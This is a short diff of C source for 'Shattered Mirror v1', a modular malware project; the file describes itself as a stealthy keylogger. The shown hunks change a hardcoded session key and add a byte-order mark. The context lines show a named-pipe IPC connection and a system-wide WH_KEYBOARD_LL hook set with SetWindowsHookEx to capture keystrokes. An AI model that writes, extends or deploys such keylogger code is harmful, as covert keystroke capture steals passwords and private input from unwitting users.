@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 02: Keystroke Capture
  *
  * Implements a stealthy keylogger using WH_KEYBOARD_LL.
@@ -123,7 +123,7 @@ DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
     
-    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
+    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";
 
     /* Set the system-wide hook. Requires user32.dll */
     s_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
